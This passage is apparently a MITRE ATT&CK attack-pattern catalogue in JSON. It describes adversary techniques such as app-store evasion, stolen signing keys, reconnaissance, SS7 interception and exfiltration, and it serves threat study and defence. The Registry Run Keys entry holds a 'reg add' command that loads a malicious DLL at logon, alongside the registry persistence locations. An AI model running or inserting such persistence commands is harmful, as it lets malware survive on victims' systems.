{
  "authors": [
    "MITRE"
  ],
  "category": "attack-pattern",
  "description": "ATT&CK tactic",
  "name": "Attack Pattern",
  "source": "https://github.com/mitre/cti",
  "type": "mitre-attack-pattern",
  "uuid": "dcb864dc-775f-11e7-9fbb-1f41b4996683",
  "values": [
    {
      "description": "Many mobile devices are configured to only allow applications to be installed from the mainstream vendor app stores (e.g., Apple App Store and Google Play Store). An adversary can submit multiple code samples to these stores deliberately designed to probe the stores' security analysis capabilities, with the goal of determining effective techniques to place malicious applications in the stores that could then be delivered to targeted devices. (Citation: Android Bouncer) (Citation: Adventures in BouncerLand) (Citation: Jekyll on iOS) (Citation: Fruit vs Zombies)",
      "meta": {
        "external_id": "T1393",
        "kill_chain": [
          "mitre-pre-attack:test-capabilities"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1393"
        ]
      },
      "uuid": "c9e85b80-39e8-42df-b275-86a2afcea9e8",
      "value": "Test ability to evade automated mobile application security analysis performed by app stores - T1393"
    },
    {
      "description": "The adversary can use account credentials or signing keys of an existing mobile app developer to publish malicious updates of existing mobile apps to an application store, or to abuse the developer's identity and reputation to publish new malicious apps.  Many mobile devices are configured to automatically install new versions of already-installed apps. (Citation: Fraudenlent Apps Stolen Dev Credentials)",
      "meta": {
        "external_id": "T1391",
        "kill_chain": [
          "mitre-pre-attack:persona-development"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1391"
        ]
      },
      "uuid": "7a265bf0-6acc-4f43-8b22-2e58b443e62e",
      "value": "Choose pre-compromised mobile app developer account credentials or signing keys - T1391"
    },
    {
      "description": "Software applications will be built using different technologies, languages, and dependencies. This information may reveal vulnerabilities or opportunities to an adversary. (Citation: CommonApplicationAttacks) (Citation: WebApplicationSecurity) (Citation: SANSTop25)",
      "meta": {
        "external_id": "T1261",
        "kill_chain": [
          "mitre-pre-attack:technical-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1261"
        ]
      },
      "uuid": "ef6197fd-a58a-4006-bfd6-1d7765d8409d",
      "value": "Enumerate externally facing software applications technologies, languages, and dependencies - T1261"
    },
    {
      "description": "The adversary can obtain an Apple iOS enterprise distribution key pair and certificate and use it to distribute malicious apps directly to Apple iOS devices without the need to publish the apps to the Apple App Store (where the apps could potentially be detected). (Citation: Apple Developer Enterprise Porgram Apps) (Citation: Fruit vs Zombies) (Citation: WIRELURKER) (Citation: Sideloading Change)",
      "meta": {
        "external_id": "T1392",
        "kill_chain": [
          "mitre-pre-attack:persona-development"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1392"
        ]
      },
      "uuid": "d58f3996-e293-4f69-a2c8-0e1851cb8297",
      "value": "Obtain Apple iOS enterprise distribution key pair and certificate - T1392"
    },
    {
      "description": "Social media provides insight into the target's affiliations with groups and organizations.  Certification information can explain their technical associations and professional associations. Personal information can provide data for exploitation or even blackmail. (Citation: Scasny2015)",
      "meta": {
        "external_id": "T1295",
        "kill_chain": [
          "mitre-pre-attack:people-weakness-identification"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1295"
        ]
      },
      "uuid": "ee40d054-6e83-4302-88dc-a3af98821d8d",
      "value": "Analyze social and business relationships, interests, and affiliations - T1295"
    },
    {
      "description": "An adversary needs the necessary skills to set up procured equipment and software to create their desired infrastructure. (Citation: KasperskyRedOctober)",
      "meta": {
        "external_id": "T1336",
        "kill_chain": [
          "mitre-pre-attack:establish-&-maintain-infrastructure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1336"
        ]
      },
      "uuid": "73e394e5-3d8a-40d1-ab8c-a1b4ea9db424",
      "value": "Install and configure hardware, network, and systems - T1336"
    },
    {
      "description": "There is usually a delay between when a vulnerability or exploit is discovered and when it is made public. An adversary may target the systems of those known to research vulnerabilities in order to gain that knowledge for use during a different attack. (Citation: TempertonDarkHotel)",
      "meta": {
        "external_id": "T1354",
        "kill_chain": [
          "mitre-pre-attack:build-capabilities"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1354"
        ]
      },
      "uuid": "5a68c603-d7f9-4535-927e-ab56819eaa85",
      "value": "Compromise 3rd party or closed-source vulnerability/exploit information - T1354"
    },
    {
      "description": "An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. The adversary may need to discover new exploits when existing exploits are no longer relevant to the environment they are trying to compromise. An adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. (Citation: EquationQA)",
      "meta": {
        "external_id": "T1350",
        "kill_chain": [
          "mitre-pre-attack:build-capabilities"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1350",
          "https://www.threatminer.org/_reports/2015/Equation_group_questions_and_answers.pdf"
        ]
      },
      "uuid": "82bbd209-f516-45e0-9542-4ffbbc2a8717",
      "value": "Discover new exploits and monitor exploit-provider forums - T1350"
    },
    {
      "description": "A wide variety of 3rd party software services  are available (e.g., [Twitter](https://twitter.com), [Dropbox](https://www.dropbox.com), [GoogleDocs](https://www.google.com/docs/about)). Use of these solutions allow an adversary to stage, launch, and execute an attack from infrastructure that does not physically tie back to them and can be rapidly provisioned, modified, and shut down. (Citation: LOWBALL2015)",
      "meta": {
        "external_id": "T1330",
        "kill_chain": [
          "mitre-pre-attack:establish-&-maintain-infrastructure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1330"
        ]
      },
      "related": [
        {
          "dest-uuid": "1a295f87-af63-4d94-b130-039d6221fb11",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "488da8ed-2887-4ef6-a39a-5b69bc6682c6",
      "value": "Acquire and/or use 3rd party software services - T1330"
    },
    {
      "description": "A wide variety of cloud, virtual private services, hosting, compute, and storage solutions are available. Additionally botnets are available for rent or purchase. Use of these solutions allow an adversary to stage, launch, and execute an attack from infrastructure that does not physically tie back to them and can be rapidly provisioned, modified, and shut down. (Citation: LUCKYCAT2012)",
      "meta": {
        "external_id": "T1307",
        "kill_chain": [
          "mitre-pre-attack:adversary-opsec"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1307"
        ]
      },
      "related": [
        {
          "dest-uuid": "795c1a92-3a26-453e-b99a-6a566aa94dc6",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "286cc500-4291-45c2-99a1-e760db176402",
      "value": "Acquire and/or use 3rd party infrastructure services - T1307"
    },
    {
      "description": "A wide variety of 3rd party software services  are available (e.g., [Twitter](https://twitter.com), [Dropbox](https://www.dropbox.com), [GoogleDocs](https://www.google.com/docs/about)). Use of these solutions allow an adversary to stage, launch, and execute an attack from infrastructure that does not physically tie back to them and can be rapidly provisioned, modified, and shut down. (Citation: LUCKYCAT2012) (Citation: Nemucod Facebook)",
      "meta": {
        "external_id": "T1308",
        "kill_chain": [
          "mitre-pre-attack:adversary-opsec"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1308"
        ]
      },
      "related": [
        {
          "dest-uuid": "488da8ed-2887-4ef6-a39a-5b69bc6682c6",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "1a295f87-af63-4d94-b130-039d6221fb11",
      "value": "Acquire and/or use 3rd party software services - T1308"
    },
    {
      "description": "An adversary can test their planned method of attack against existing security products such as email filters or intrusion detection sensors (IDS). (Citation: WiredVirusTotal)",
      "meta": {
        "external_id": "T1361",
        "kill_chain": [
          "mitre-pre-attack:test-capabilities"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1361"
        ]
      },
      "uuid": "c9ac5715-ee5c-4380-baf4-6f12e304ca93",
      "value": "Test signature detection for file upload/email filters - T1361"
    },
    {
      "description": "A wide variety of cloud, virtual private services, hosting, compute, and storage solutions are available. Additionally botnets are available for rent or purchase. Use of these solutions allow an adversary to stage, launch, and execute an attack from infrastructure that does not physically tie back to them and can be rapidly provisioned, modified, and shut down. (Citation: TrendmicroHideoutsLease)",
      "meta": {
        "external_id": "T1329",
        "kill_chain": [
          "mitre-pre-attack:establish-&-maintain-infrastructure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1329"
        ]
      },
      "related": [
        {
          "dest-uuid": "286cc500-4291-45c2-99a1-e760db176402",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "795c1a92-3a26-453e-b99a-6a566aa94dc6",
      "value": "Acquire and/or use 3rd party infrastructure services - T1329"
    },
    {
      "description": "Code signing is the process of digitally signing executables or scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Users may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is. (Citation: Adobe Code Signing Cert)",
      "meta": {
        "external_id": "T1310",
        "kill_chain": [
          "mitre-pre-attack:adversary-opsec"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1310"
        ]
      },
      "related": [
        {
          "dest-uuid": "03f4a766-7a21-4b5e-9ccf-e0cf422ab983",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "e5164428-03ca-4336-a9a7-4d9ea1417e59",
      "value": "Acquire or compromise 3rd party signing certificates - T1310"
    },
    {
      "description": "A malicious application can request Device Administrator privileges. If the user grants the privileges, the application can take steps to make its removal more difficult.",
      "meta": {
        "external_id": "APP-22",
        "kill_chain": [
          "mitre-mobile-attack:persistence"
        ],
        "mitre_platforms": [
          "Android"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1401",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-22.html"
        ]
      },
      "uuid": "82f04b1e-5371-4a6f-be06-411f0f43b483",
      "value": "Abuse Device Administrator Access to Prevent Removal - T1401"
    },
    {
      "description": "Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it for some or all of the attack cycle. (Citation: WateringHole2014) (Citation: FireEye Operation SnowMan)",
      "meta": {
        "external_id": "T1312",
        "kill_chain": [
          "mitre-pre-attack:adversary-opsec"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1312"
        ]
      },
      "related": [
        {
          "dest-uuid": "e51398e6-53dc-4e9f-a323-e54683d8672b",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "4900fabf-1142-4c1f-92f5-0b590e049077",
      "value": "Compromise 3rd party infrastructure to support delivery - T1312"
    },
    {
      "description": "Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Users may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is. (Citation: DiginotarCompromise)",
      "meta": {
        "external_id": "T1332",
        "kill_chain": [
          "mitre-pre-attack:establish-&-maintain-infrastructure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1332"
        ]
      },
      "related": [
        {
          "dest-uuid": "e5164428-03ca-4336-a9a7-4d9ea1417e59",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "03f4a766-7a21-4b5e-9ccf-e0cf422ab983",
      "value": "Acquire or compromise 3rd party signing certificates - T1332"
    },
    {
      "description": "Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it for some or all of the attack cycle. (Citation: WateringHole2014) (Citation: FireEye Operation SnowMan)",
      "meta": {
        "external_id": "T1334",
        "kill_chain": [
          "mitre-pre-attack:establish-&-maintain-infrastructure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1334"
        ]
      },
      "related": [
        {
          "dest-uuid": "4900fabf-1142-4c1f-92f5-0b590e049077",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "e51398e6-53dc-4e9f-a323-e54683d8672b",
      "value": "Compromise 3rd party infrastructure to support delivery - T1334"
    },
    {
      "description": "This technique has been deprecated. Please see ATT&CK's Initial Access and Execution tactics for replacement techniques.\n\nThrough social engineering or other methods, an adversary can get users to perform physical actions that provide access to an adversary.  This could include providing a password over the phone or inserting a 'found' CD or USB into a system. (Citation: AnonHBGary) (Citation: CSOInsideOutside)",
      "meta": {
        "external_id": "T1385",
        "kill_chain": [
          "mitre-pre-attack:compromise"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1385"
        ]
      },
      "uuid": "fb39384c-00e4-414a-88af-e80c4904e0b8",
      "value": "Human performs requested action of physical nature - T1385"
    },
    {
      "description": "An adversary could abuse an iOS enterprise app signing key (intended for enterprise in-house distribution of apps) to sign malicious iOS apps so that they can be installed on iOS devices without the app needing to be published on Apple's App Store. For example, Xiao describes use of this technique in  (Citation: Xiao-iOS).\n\nDetection: iOS 9 and above typically requires explicit user consent before allowing installation of applications signed with enterprise distribution keys rather than installed from Apple's App Store.\n\nPlatforms: iOS",
      "meta": {
        "external_id": "T1445",
        "refs": [
          "https://attack.mitre.org/techniques/T1445"
        ]
      },
      "related": [
        {
          "dest-uuid": "53263a67-075e-48fa-974b-91c5b5445db7",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "revoked-by"
        }
      ],
      "uuid": "51aedbd6-2837-4d15-aeb0-cb09f2bf22ac",
      "value": "Abuse of iOS Enterprise App Signing Key - T1445"
    },
    {
      "description": "Malicious applications are a common attack vector used by adversaries to gain a presence on mobile devices. Mobile devices often are configured to allow application installation only from an authorized app store (e.g., Google Play Store or Apple App Store). An adversary may seek to place a malicious application in an authorized app store, enabling the application to be installed onto targeted devices.\n\nApp stores typically require developer registration and use vetting techniques to identify malicious applications. Adversaries may use these techniques against app store defenses:\n\n* [Download New Code at Runtime](https://attack.mitre.org/techniques/T1407)\n* [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1406)\n\nAdversaries may also seek to evade vetting by placing code in a malicious application to detect whether it is running in an app analysis environment and, if so, avoid performing malicious actions while under analysis. (Citation: Petsas) (Citation: Oberheide-Bouncer) (Citation: Percoco-Bouncer) (Citation: Wang)\n\nAdversaries may also use fake identities, payment cards, etc., to create developer accounts to publish malicious applications to app stores. (Citation: Oberheide-Bouncer)\n\nAdversaries may also use control of a target's Google account to use the Google Play Store's remote installation capability to install apps onto the Android devices associated with the Google account. (Citation: Oberheide-RemoteInstall) (Citation: Konoth) (Only applications that are available for download through the Google Play Store can be remotely installed using this technique.)",
      "meta": {
        "external_id": "ECO-22",
        "kill_chain": [
          "mitre-mobile-attack:initial-access"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1475",
          "https://pages.nist.gov/mobile-threat-catalogue/ecosystem-threats/ECO-4.html",
          "https://pages.nist.gov/mobile-threat-catalogue/ecosystem-threats/ECO-16.html",
          "https://pages.nist.gov/mobile-threat-catalogue/ecosystem-threats/ECO-17.html",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-20.html",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-21.html",
          "https://pages.nist.gov/mobile-threat-catalogue/ecosystem-threats/ECO-22.html",
          "http://dl.acm.org/citation.cfm?id=2592796",
          "https://jon.oberheide.org/files/summercon12-bouncer.pdf",
          "https://media.blackhat.com/bh-us-12/Briefings/Percoco/BH_US_12_Percoco_Adventures_in_Bouncerland_WP.pdf",
          "https://www.usenix.org/conference/usenixsecurity13/technical-sessions/presentation/wang_tielei",
          "https://jon.oberheide.org/blog/2010/06/25/remote-kill-and-install-on-google-android/",
          "http://www.vvdveen.com/publications/BAndroid.pdf"
        ]
      },
      "uuid": "d9db3d46-66ca-44b4-9daa-1ef97cb7465a",
      "value": "Deliver Malicious App via Authorized App Store - T1475"
    },
    {
      "description": "An adversary could make educated guesses of the device lock screen's PIN/password (e.g., commonly used values, birthdays, anniversaries) or attempt a dictionary or brute force attack against it. Brute force attacks could potentially be automated (Citation: PopSci-IPBox).\n\nPlatforms: Android, iOS",
      "meta": {
        "external_id": "T1459",
        "refs": [
          "https://attack.mitre.org/techniques/T1459"
        ]
      },
      "related": [
        {
          "dest-uuid": "dfe29258-ce59-421c-9dee-e85cb9fa90cd",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "revoked-by"
        }
      ],
      "uuid": "f296fc9c-2ff5-43ee-941e-6b49c438270a",
      "value": "Device Unlock Code Guessing or Brute Force - T1459"
    },
    {
      "description": "Once generated, Key Intelligence Topics (KITs), Key Intelligence Questions (KIQs), and/or intelligence requirements are assigned to applicable agencies and/or personnel. For example, an adversary may decide nuclear energy requirements should be assigned to a specific organization based on their mission. (Citation: AnalystsAndPolicymaking) (Citation: JP2-01)",
      "meta": {
        "external_id": "T1238",
        "kill_chain": [
          "mitre-pre-attack:priority-definition-direction"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1238"
        ]
      },
      "uuid": "4fad17d3-8f42-449d-ac4b-dbb4c486127d",
      "value": "Assign KITs, KIQs, and/or intelligence requirements - T1238"
    },
    {
      "description": "Analysts assess current information available against requirements that outline needs and wants as part of the research baselining process to begin satisfying a requirement. (Citation: CyberAdvertisingChar) (Citation: CIATradecraft) (Citation: ForensicAdversaryModeling) (Citation: CyberAdversaryBehavior)",
      "meta": {
        "external_id": "T1236",
        "kill_chain": [
          "mitre-pre-attack:priority-definition-planning"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1236"
        ]
      },
      "uuid": "8e927b19-04a6-4aaa-a42f-4f0a53411d27",
      "value": "Assess current holdings, needs, and wants - T1236"
    },
    {
      "description": "Once they have been created, intelligence requirements, Key Intelligence Topics (KITs), and Key Intelligence Questions (KIQs) are submitted into a central management system. (Citation: ICD204) (Citation: KIT-Herring)",
      "meta": {
        "external_id": "T1237",
        "kill_chain": [
          "mitre-pre-attack:priority-definition-direction"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1237"
        ]
      },
      "uuid": "03da0598-ed46-4a73-bf43-0313b3522400",
      "value": "Submit KITs, KIQs, and intelligence requirements - T1237"
    },
    {
      "description": "Certain types of traffic (e.g., Twitter14, HTTP) are more commonly used than others. Utilizing more common protocols and software may make an adversary's traffic more difficult to distinguish from legitimate traffic. (Citation: symantecNITRO)",
      "meta": {
        "external_id": "T1321",
        "kill_chain": [
          "mitre-pre-attack:adversary-opsec"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1321"
        ]
      },
      "uuid": "0c592c79-29a7-4a94-81a4-c87eae3aead6",
      "value": "Common, high volume protocols and software - T1321"
    },
    {
      "description": "Using alternative payment options allows an adversary to hide their activities. Options include crypto currencies, barter systems, pre-paid cards or shell accounts. (Citation: Goodin300InBitcoins)",
      "meta": {
        "external_id": "T1316",
        "kill_chain": [
          "mitre-pre-attack:adversary-opsec"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1316"
        ]
      },
      "uuid": "b79e8a3f-a109-47c2-a0e3-564955590a3d",
      "value": "Non-traditional or less attributable payment options - T1316"
    },
    {
      "description": "For attacks incorporating social engineering the utilization of an on-line persona is important. Utilizing an existing persona with compromised accounts may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. (Citation: AnonHBGary) (Citation: Hacked Social Media Accounts)",
      "meta": {
        "external_id": "T1343",
        "kill_chain": [
          "mitre-pre-attack:persona-development"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1343"
        ]
      },
      "uuid": "9a8c47f6-ae69-4044-917d-4b1602af64d9",
      "value": "Choose pre-compromised persona and affiliated accounts - T1343"
    },
    {
      "description": "The mobile device could contain built-in functionality with malicious behavior or exploitable vulnerabilities. An adversary could deliberately insert and take advantage of the malicious behavior or could exploit inadvertent vulnerabilities. In many cases, it is difficult to be certain whether exploitable functionality is due to malicious intent or simply an inadvertent mistake.\n\nPlatforms: Android, iOS",
      "meta": {
        "external_id": "T1473",
        "refs": [
          "https://attack.mitre.org/techniques/T1473"
        ]
      },
      "related": [
        {
          "dest-uuid": "0d95940f-9583-4e0f-824c-a42c1be47fad",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "revoked-by"
        }
      ],
      "uuid": "f9e4f526-ac9d-4df5-8949-833a82a1d2df",
      "value": "Malicious or Vulnerable Built-in Device Functionality - T1473"
    },
    {
      "description": "Many applications use third-party software libraries, often without full knowledge of the behavior of the libraries by the application developer. For example, mobile applications often incorporate advertising libraries to generate revenue for the application developer. Vulnerabilities in these third-party libraries could potentially be exploited in any application that uses the library, and even if the vulnerabilities are fixed, many applications may still use older, vulnerable versions of the library. (Citation: Flexera News Vulnerabilities) (Citation: Android Security Review 2015) (Citation: Android Multidex RCE)",
      "meta": {
        "external_id": "T1389",
        "kill_chain": [
          "mitre-pre-attack:technical-weakness-identification"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1389"
        ]
      },
      "uuid": "ad124f84-52d2-40e3-95dd-cfdd44eae6ef",
      "value": "Identify vulnerabilities in third-party software libraries - T1389"
    },
    {
      "description": "Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nThe <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nThe following Registry keys can be used to set startup folder items for persistence:\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> subkeys can automatically launch programs.\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run when any user logs on.\n\nBy default, the multistring BootExecute value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",
      "meta": {
        "external_id": "CAPEC-270",
        "kill_chain": [
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "Windows Registry",
          "File monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1060",
          "https://capec.mitre.org/data/definitions/270.html",
          "http://msdn.microsoft.com/en-us/library/aa376977",
          "https://support.microsoft.com/help/310593/description-of-the-runonceex-registry-key",
          "https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/",
          "https://technet.microsoft.com/en-us/sysinternals/bb963902"
        ]
      },
      "uuid": "9422fc14-1c43-410d-ab0f-a709b76c72dc",
      "value": "Registry Run Keys / Startup Folder - T1060"
    },
    {
      "description": "An adversary could exploit signaling system vulnerabilities to redirect calls or text messages (SMS) to a phone number under the attacker's control. The adversary could then act as a man-in-the-middle to intercept or manipulate the communication. (Citation: Engel-SS7) (Citation: Engel-SS7-2008) (Citation: 3GPP-Security) (Citation: Positive-SS7) (Citation: CSRIC5-WG10-FinalReport) Interception of SMS messages could enable adversaries to obtain authentication codes used for multi-factor authentication(Citation: TheRegister-SS7).",
      "meta": {
        "external_id": "CEL-37",
        "kill_chain": [
          "mitre-mobile-attack:network-effects"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1449",
          "https://pages.nist.gov/mobile-threat-catalogue/cellular-threats/CEL-37.html",
          "https://berlin.ccc.de/~tobias/31c3-ss7-locate-track-manipulate.pdf",
          "https://www.youtube.com/watch?v=q0n5ySqbfdI",
          "http://www.3gpp.org/ftp/tsg_sa/wg3_security/_specs/33900-120.pdf",
          "https://www.ptsecurity.com/upload/ptcom/PT-SS7-AD-Data-Sheet-eng.pdf",
          "https://www.fcc.gov/files/csric5-wg10-finalreport031517pdf",
          "https://www.theregister.co.uk/2017/05/03/hackers_fire_up_ss7_flaw/"
        ]
      },
      "uuid": "fb3fa94a-3aee-4ab0-b7e7-abdf0a51286d",
      "value": "Exploit SS7 to Redirect Phone Calls/SMS - T1449"
    },
    {
      "description": "Data exfiltration is performed over the Command and Control channel. Data is encoded into the normal communications channel using the same protocol as command and control communications.",
      "meta": {
        "external_id": "T1041",
        "kill_chain": [
          "mitre-attack:exfiltration"
        ],
        "mitre_data_sources": [
          "User interface",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1041",
          "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
        ]
      },
      "uuid": "92d7da27-2d91-488e-a00c-059dc162766d",
      "value": "Exfiltration Over Command and Control Channel - T1041"
    },
    {
      "description": "Physical access may be required for certain types of adversarial actions. (Citation: CyberPhysicalAssessment) (Citation: CriticalInfrastructureAssessment)",
      "meta": {
        "external_id": "T1302",
        "kill_chain": [
          "mitre-pre-attack:organizational-weakness-identification"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1302"
        ]
      },
      "uuid": "31a57c70-6709-4d06-a473-c3df1f74c1d4",
      "value": "Assess security posture of physical locations - T1302"
    },
    {
      "description": "Domain Names are the human readable names used to represent one or more IP addresses. IP addresses are the unique identifier of computing devices on a network. Both pieces of information are valuable to an adversary who is looking to understand the structure of a network. (Citation: RSA-APTRecon)",
      "meta": {
        "external_id": "T1250",
        "kill_chain": [
          "mitre-pre-attack:technical-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1250"
        ]
      },
      "uuid": "23ecb7e0-0340-43d9-80a5-8971fe866ddf",
      "value": "Determine domain and IP address space - T1250"
    },
    {
      "description": "If an adversary can identify which security tools a victim is using they may be able to identify ways around those tools. (Citation: CrowdStrike Putter Panda)",
      "meta": {
        "external_id": "T1290",
        "kill_chain": [
          "mitre-pre-attack:technical-weakness-identification"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1290",
          "http://cdn0.vox-cdn.com/assets/4589853/crowdstrike-intelligence-report-putter-panda.original.pdf"
        ]
      },
      "uuid": "b26babc7-9127-4bd5-9750-5e49748c9be3",
      "value": "Research visibility gap of security vendors - T1290"
    },
    {
      "description": "An adversary could exploit signaling system vulnerabilities to track the location of mobile devices. (Citation: Engel-SS7) (Citation: Engel-SS7-2008) (Citation: 3GPP-Security) (Citation: Positive-SS7) (Citation: CSRIC5-WG10-FinalReport)",
      "meta": {
        "external_id": "CEL-38",
        "kill_chain": [
          "mitre-mobile-attack:network-effects"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1450",
          "https://pages.nist.gov/mobile-threat-catalogue/cellular-threats/CEL-38.html",
          "https://berlin.ccc.de/~tobias/31c3-ss7-locate-track-manipulate.pdf",
          "https://www.youtube.com/watch?v=q0n5ySqbfdI",
          "http://www.3gpp.org/ftp/tsg_sa/wg3_security/_specs/33900-120.pdf",
          "https://www.ptsecurity.com/upload/ptcom/PT-SS7-AD-Data-Sheet-eng.pdf",
